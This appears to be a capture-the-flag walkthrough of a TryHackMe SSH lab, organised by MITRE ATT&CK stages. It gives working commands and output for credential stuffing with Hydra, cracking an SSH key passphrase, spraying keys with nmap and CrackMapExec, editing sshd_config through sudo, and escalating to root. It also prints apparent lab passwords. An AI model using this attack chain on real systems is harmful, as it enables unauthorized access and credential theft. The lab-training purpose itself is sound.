# Just SSH Walkthrough

## Overview
**Platform**: TryHackMe  
**Box Name**: Just SSH  
**Difficulty**: Medium  
**Description**: A box made for pentesting SSH. Utilize common enumeration, exploitation, and privilege escalation techniques to compromise a vulnerable SSH service and gain root access.

---

## Recon and Enumeration (MITRE ATT&CK Outline)

| Technique ID                                        | Name                               | Tool(s) Used                     |
| --------------------------------------------------- | ---------------------------------- | -------------------------------- |
| [T1595](https://attack.mitre.org/techniques/T1595/) | Active Scanning                    | NMAP                             |
| [T1592](https://attack.mitre.org/techniques/T1592/) | Gather Victim Host Information     | ssh -v                           |
| [T1591](https://attack.mitre.org/techniques/T1591/) | Gather Victim Org Information      | ssh -v                           |
| [T1589](https://attack.mitre.org/techniques/T1589/) | Gather Victim Identity Information | Breached Creds, Personnel Roster |

---

Steps

1. Perform Active Scanning with NMAP:
Command:
```bash
sudo nmap $ip -Pn -n -oA discScan
```

<PRE>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
Nmap scan report for 10.10.43.128
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
</PRE>
---

2. Gather Host Information with SSH Debug Mode:
Command:
```bash
ssh -v $ip
```
Truncated Output:
<PRE>
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
debug1: SSH2_MSG_SERVICE_ACCEPT received

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

debug1: Authentications that can continue: publickey,password
debug1: Will attempt key: /home/not-root/.ssh/id_rsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_xmss 

</PRE>

---

What We Know

- Open Ports: Port 22 (SSH) is open.
- SSH Service Information:
  - Protocol: SSH v2.0
  - Software Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
  - Banner Information: The server is part of "Nexora Solutions."
  - Authentication Methods: Publickey and Password
  - Acceptable Keys: Several key types, including id_rsa, id_ecdsa, and others, are attempted automatically.
- Potential Naming Convention: The banner includes emails, e.g., j_davis@nexora-solutions.com suggesting a naming convention of f_last.

---

What We Have

- Personnel Roster: Names and potential user accounts.
- Breached Credentials: Password list from previous breaches.

---

What We Can Do

1. Craft a credential stuffing attack using breached credentials and the observed naming convention (f_last).

---

## Initial Access (MITRE ATT&CK Outline)

| Technique ID                                                 | Name                | Tool(s) Used |
| ------------------------------------------------------------ | ------------------- | ------------ |
| [T1078](https://attack.mitre.org/techniques/T1078/)          | Valid Accounts      | Hydra, SSH   |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)      | Credential Stuffing | Hydra        |

---

### Steps

1. **Crafting the Credential Stuffing Attack**

Make a `users.txt` list which reflects the naming convention found on the SSH Banner:  
Naming Convention: `f_lastName`
<details>
<summary>Example `users.txt`:</summary>
<PRE>
j_davis  
b_harris  
l_jackson  
c_thomas  
e_anderson  
d_white  
a_garcia  
j_smith  
j_moore  
m_brown  
m_martin  
s_miller  
p_martinez  
d_wilson  
e_johnson  
r_taylor  
j_thompson  
</PRE>
</details>  

With `users.txt` and the breached credentials list, initiate the credential stuffing attack:  

Command:
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```
  
Output:  
<PRE>
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task  
[DATA] attacking ssh://10.10.43.128:22/  
[22][ssh] host: 10.10.43.128   login: j_moore   password: **********  
[22][ssh] host: 10.10.43.128   login: m_brown   password: **********  
1 of 1 target successfully completed, 2 valid passwords found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07  
</PRE>

---

2. **Gain Initial Foothold**

Use the newly found credentials to gain access to the target and retrieve the user flag:  

Commands:  
```bash
ssh j_moore@$ip  
cat /home/j_moore/userFlag.txt 
```

---

## Lateral Movement (MITRE ATT&CK Outline)

| Technique ID                                            | Name                  | Tool(s) Used                    |
| ------------------------------------------------------- | --------------------- | ------------------------------- |
| [T1021](https://attack.mitre.org/techniques/T1021/004/) | Remote Services       | SSH                             |
| [T1552](https://attack.mitre.org/techniques/T1552/)     | Unsecured Credentials | Manual Enumeration / LinPEAS.sh |
| [T1110](https://attack.mitre.org/techniques/T1110/002/) | Password Cracking     | ssh2john, john/hashcat          |
| [T1110](https://attack.mitre.org/techniques/T1110/003/) | Password Spraying     | NMAP Scripting Engine           |

---

### Steps

1. **Internal Recon and Enumeration with LinPEAS**

Transfer LinPEAS to the target system and execute it using j_moore's profile:  

Command:  
```bash
bash linpeas.sh  
```
Truncated Output:
<PRE>
══╣ Possible private SSH keys were found!  
/home/j_moore/.ssh/id_rsa  
/home/sftp/uploads/.temp_keys/id_rsa_backup_script  
/home/sftp/uploads/.temp_keys/id_rsa_contractor1  
/home/sftp/uploads/.temp_keys/id_rsa_audit  

Additionally:  
-rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara  
</PRE>

---

### What We Know

- Nexora-Solutions uses public keys to access services and accounts.  
- SSH Key Sprawl is evident, suggesting improper key management.  
- j_moore is part of the `sftp_service` group.  

---

### What We Have

- Private Keys for:
  - j_moore
  - m_brown
  - backup_script
  - contractor1
  - audit  

---

### What We Can Do

1. Test j_moore's private key against the SFTP service.  
2. Conduct an SSH Key Spray attack to identify additional access points.  

---

### j_moore, Lateral Move to SFTP

Log into the SFTP service using j_moore's id_rsa:
Command:  
```bash
sftp -i id_rsa sftp@$ip  
```
Expected Output:  
<PRE>
The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.  
ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.  
This key is not known by any other names  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.10.64.168' (ED25519) to the list of known hosts.  

**************************************************************************  
*                           Nexora Solutions                             *  
*                    Secure Shell (SSH) Access Portal                    *  
**************************************************************************  

NOTICE: This system is for authorized use only. Unauthorized access or use  
is prohibited and may result in disciplinary action and/or civil and  
criminal penalties. All activities on this system are monitored and  
recorded.  

For assistance, contact:  
  support@nexora-solutions.com  
  j_davis@nexora-solutions.com  

Enter passphrase for key 'id_rsa':  
</PRE>
---

Before logging into the SFTP service, the passphrase for the id_rsa key must be cracked.

---

#### Cracking SSH Passphrases

Step 1: Transfer j_moore's id_rsa to the attack computer.  
Step 2: Utilize ssh2john to output a hash format for John/Hashcat to crack against.  

Command:  
```bash
ssh2john id_rsa_moore > moore.hash
```

Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password).  

Command:  
```bash
john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt  
```

Expected Output:  
<PRE>
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 16 for all loaded hashes  
Will run 3 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
********         (id_rsa_moore)       
1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
</PRE>

---

With the id_rsa passphrase, test j_moore's id_rsa against the SFTP service.  
Command:  
```bash
sftp -i id_rsa sftp@$ip 
```
 
Expected Output:  
<PRE>
Enter passphrase for key 'id_rsa':  
Connected to 10.10.64.168.  
sftp>  
</PRE>

---

<details>
<summary>Alternate Method of Accessing SFTP</summary>

### Key Spray Using j_moore's id_rsa

This method is optional but serves as a valuable habit when testing SSH keys for access.

#### Crafting the Key Spray Attack

- **Step 1:** Create a user list to spray against:
  ```bash
  ls /home > users.txt
  ```
  <details>
  <summary>List of Users</summary>
  <pre>
  d_wilson
  e_johnson
  j_davis
  j_moore
  j_smith
  m_brown
  net-admin
  s_miller
  sftp
  sys-admin
  </pre>
  </details>

- **Step 2:** Ensure j_moore's `id_rsa` has the correct permissions:
  ```bash
  chmod 600 id_rsa_moore
  ```

---

#### Execute the SSH Key Spray

Use the Nmap Scripting Engine (NSE) to conduct the SSH Key Spray attack.

**Note:** Nmap generally performs better with passphrase-protected private keys compared to other tools (e.g., CrackMapExec, Metasploit), which work better with unprotected private keys.

```bash
sudo nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"b_harris","d_wilson","e_johnson","j_davis","j_smith","m_brown","net-admin","s_miller","sftp","sys-admin"},ssh.privatekeys={"id_rsa_moore"},ssh.passphrases={"********"}' $ip
```

<details>
<summary>NMAP Syntax</summary>
<pre>
sudo nmap -p 22: Scan port 22 (SSH).
--script ssh-publickey-acceptance: Use the ssh-publickey-acceptance script to test SSH login with keys.
--script-args: Provide arguments for the script:
    ssh.usernames: List of usernames to test.
    ssh.privatekeys: List of private key file paths.
    ssh.passphrases: List of passphrases for private keys.
$ip: Target IP address.
Example Script Arguments:
    ssh.usernames={"b_harris","d_wilson","e_johnson","j_davis","j_smith","m_brown","net-admin","s_miller","sftp","sys-admin"}: Users to test.
    ssh.privatekeys={"id_rsa_moore"}: Private key file to test.
    ssh.passphrases={"********"}: Passphrase for the private key.
</pre>
</details>
<pre>
Example Output:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-07 23:50 EST
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Failed to authenticate
NSE: [ssh-publickey-acceptance] Found accepted key: jMoore_id_rsa for user sftp
NSE: [ssh-publickey-acceptance] Failed to authenticate
Nmap scan report for 10.10.166.179
Host is up (0.22s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-publickey-acceptance: 
|   Accepted Public Keys: 
|_    Key jMoore_id_rsa accepted for user sftp

Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
</pre>
</details>
</details>

---

### SFTP, Lateral Move to net-admin

#### Enumerating SFTP Documents
Retrieve all files from the SFTP server for analysis:

```bash
cd uploads
get -r *
get .temp_keys
```

<details>
<summary>Output for 'get -r *' Command</summary>
<pre>
Fetching /uploads/conf.bak/ to conf.bak
Retrieving /uploads/conf.bak
sw1.config                                                                                                                            100% 1323     1.1MB/s   00:00    
sw2.config                                                                                                                            100% 1466     1.3MB/s   00:00    
r1.conf                                                                                                                               100% 1184     1.2MB/s   00:00    
Fetching /uploads/internship.bak/ to internship.bak
Retrieving /uploads/internship.bak
welcome.txt                                                                                                                           100% 2796     3.1MB/s   00:00    
internshipChecklist.txt                                                                                                               100% 2034     1.0MB/s   00:00    
Fetching /uploads/scripts/ to scripts
Retrieving /uploads/scripts
sw1BackUpConfig.py                                                                                                                    100%  939   137.6KB/s   00:00    
r1BackUpConfig.py                                                                                                                     100% 1617     1.4MB/s   00:00    
sw2Status.py                                                                                                                          100%  939   154.8KB/s   00:00    
Fetching /uploads/supportTickets.bak/ to supportTickets.bak
Retrieving /uploads/supportTickets.bak
[!]Ticket#NX-001                                                                                                                      100%  261   705.0KB/s   00:00    
Ticket#NX-007                                                                                                                         100%  135    65.8KB/s   00:00    
Ticket#NX-002                                                                                                                         100%  180   164.7KB/s   00:00    
Ticket#NX-004                                                                                                                         100%  113   124.6KB/s   00:00    
Ticket#NX-006                                                                                                                         100%  145   127.6KB/s   00:00    
Ticket#NX-003                                                                                                                         100%  124    74.1KB/s   00:00    
Ticket#NX-005                                                                                                                         100%  136    39.3KB/s   00:00    
Ticket#NX-001                                                                                                                         100%  290   270.2KB/s   00:00 
</pre>
</details>

---

#### Identifying the Next Attack

**What do we know**:  
- There was a request to audit the SSH Keys; however, the task was never completed.
- Barbara Harris had access to critical systems.

<details>
<summary>Key Audit Information /home/sftp/uploads/.temp_keys/README.md</summary>
<pre>
# Key Management Audit - Nexora Solutions
## Overview
This directory contains keys related to various users, contractors, and automation scripts. A key audit was initiated following the last security assessment but remains incomplete due to Barbara Harris's termination. The following keys require immediate review:
- **id_rsa_barbara**: Barbara's personal key for accessing critical systems.
- **id_rsa_contractor1**: A contractor's temporary access key. Usage expired months ago.
- **id_rsa_audit**: Key created during an external audit. No longer needed.
- **id_rsa_backup_script**: Used for automated configuration backups of routers and switches.
## Action Required
1. Delete unused keys.
2. Ensure only authorized keys remain in use.
3. Document all actions taken for compliance.
### Status
**Pending** - Assigned to Barbara Harris (Task incomplete due to termination).
### Notes
Failure to address key sprawl risks may lead to unauthorized access and breaches.
</pre>
</details>

- Barbara Harris does not have a profile on the server.

<details>
<summary>List Of Users With a Profile</summary>
<pre>
drwxr-xr-x 12 root      root      4096 Jan  3 02:23 .
drwxr-xr-x 20 root      root      4096 Dec 28 04:30 ..
drwxr-x---  3 d_wilson  d_wilson  4096 Jan  2 21:08 d_wilson
drwxr-x---  3 e_johnson e_johnson 4096 Jan  2 21:08 e_johnson
drwxr-x---  3 j_davis   j_davis   4096 Jan  2 21:08 j_davis
drwxr-x---  6 j_moore   j_moore   4096 Jan  2 21:36 j_moore
drwxr-x---  3 j_smith   j_smith   4096 Jan  2 21:08 j_smith
drwxr-x---  5 m_brown   m_brown   4096 Jan  2 21:08 m_brown
drwxr-x---  4 net-admin net-admin 4096 Jan  2 21:08 net-admin
drwxr-x---  3 s_miller  s_miller  4096 Jan  2 21:08 s_miller
drwxr-xr-x  4 root      root      4096 Jan  2 21:08 sftp
drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
</pre>
</details>

---

**What do we have**:  
- Barbara's private key.

<details>
<summary>id_rsa</summary>
<pre>
-----BEGIN OPENSSH PRIVATE KEY-----
<Truncated for brevity>
-----END OPENSSH PRIVATE KEY-----
</pre>
</details>

---

**What can we do**:  
- Conduct a SSH Key Spray Attack

#### Crafting the Key Spray Attack

- **Step 1:** Create a user list to spray against:
  ```bash
  ls /home > users.txt
  ```

<details>
<summary>List of Users</summary>
<pre>
d_wilson
e_johnson
j_davis
j_moore
j_smith
m_brown
net-admin
s_miller
sftp
sys-admin
</pre>
</details>

- **Step 2:** Ensure Barbara's id_rsa has the correct permissions:
  ```bash
  chmod 600 id_rsa_barbara
  ```

---

#### Execute the SSH Key Spray

Use CrackMapExec (CME) to conduct the Key Spray:

```bash
crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p ''
```

<details>
<summary>CME Syntax</summary>
<pre>
ssh = the service CME is working against
-u = /location/to/username/list.txt
--key-file = /location/to/id_rsa
-p = passphrase for the id_rsa (if applicable)
</pre>
</details>

<pre>
SSH         10.10.247.86    22     10.10.247.86     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.247.86    22     10.10.247.86     [-] d_wilson: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [-] e_johnson: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [-] j_davis: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [-] j_moore: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [-] j_smith: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [-] m_brown: Authentication failed.
SSH         10.10.247.86    22     10.10.247.86     [+] net-admin: (keyfile: id_rsa_barbara)  - shell access!

---

## Privilege Escalation (MITRE ATT&CK Outline)

| Technique ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges |
| [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |

---

### net-admin, Lateral Movement to sys-admin

#### Enumeration of the net-admin profile  

**Steps**

**1. Enumerate sudo privileges for `net-admin`:**
```bash
sudo -l
```
<details>
<summary>Sudo Privileges</summary>
<pre>
Matching Defaults entries for net-admin on nexora-ssh:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User net-admin may run the following commands on nexora-ssh:
    (ALL) NOPASSWD: /bin/systemctl restart sshd, /bin/systemctl stop sshd, /bin/systemctl start sshd,
                    /bin/systemctl status sshd, /usr/bin/vim /etc/ssh/sshd_config
</pre>
</details>

**2. View SSH configuration match blocks:**
```bash
sudo /usr/bin/vim /etc/ssh/sshd_config
```
<details>
<summary>SSH Match Block Configuration</summary>
<pre>
# Restrict the sftp service 'user'
Match User sftp
    ChrootDirectory /home/%u
    ForceCommand internal-sftp
    PasswordAuthentication no
    PubkeyAuthentication yes
    X11Forwarding no
    AllowTcpForwarding no
# Restrict net-admin service to pubkey only, no password login
Match User net-admin
    PasswordAuthentication no
    PubkeyAuthentication yes
# Restrict sys-admin service to pubkey only, no password login
Match User sys-admin
    PasswordAuthentication no
    PubkeyAuthentication yes
</pre>
</details>

---

#### What We Know:
- `net-admin` has sudo privileges tied to SSH service management and configuration files.
- Password authentication is disabled for `net-admin` and `sys-admin`.

#### What We Have:
- Sudo privileges for editing SSH configuration.

#### What We Can Do:
- Modify SSH configuration to enable password authentication for `net-admin` and `sys-admin`.

---

### Conducting a Credential Stuffing Attack

#### Steps:

**1. Modify SSH Match Blocks:**
```bash
sudo /usr/bin/vim /etc/ssh/sshd_config
```
Adjust the configuration:
```plaintext
# Enable password authentication for net-admin and sys-admin
Match User net-admin
    PasswordAuthentication yes
    PubkeyAuthentication yes

Match User sys-admin
    PasswordAuthentication yes
    PubkeyAuthentication yes
```

**2. Restart the SSH service:**
```bash
sudo /bin/systemctl restart sshd
```

**3. Conduct the credential stuffing attack:**
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```
<details>
<summary>Hydra Output</summary>
<pre>
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 01:33:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 70 login tries (l:10/p:7), ~5 tries per task
[DATA] attacking ssh://10.10.247.86:22/
[22][ssh] host: 10.10.247.86   login: j_moore   password: Unplanned8@Chair
[22][ssh] host: 10.10.247.86   login: m_brown   password: resetMeAfter1Use!*
[22][ssh] host: 10.10.247.86   login: sys-admin   password: **********************
1 of 1 target successfully completed, 3 valid passwords found
</pre>
</details>

---

### sys-admin, Elevate to Root

#### Steps:

**1. Switch from `net-admin` to `sys-admin`:**
```bash
su sys-admin
```

**2. Enumerate `sys-admin` sudo privileges:**
```bash
sudo -l
```
<details>
<summary>Sudo Privileges for sys-admin</summary>
<pre>
Matching Defaults entries for sys-admin on nexora-ssh:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User sys-admin may run the following commands on nexora-ssh:
    (ALL) NOPASSWD: ALL
</pre>
</details>

**3. Switch to the root user:**
```bash
sudo su
```

**4. Verify root access:**
```bash
id
```
<details>
<summary>Root Verification Output</summary>
<pre>
uid=0(root) gid=0(root) groups=0(root)
</pre>
</details>

**5. Obtain the root flag:**
```bash
cat /root/rootFlag.txt
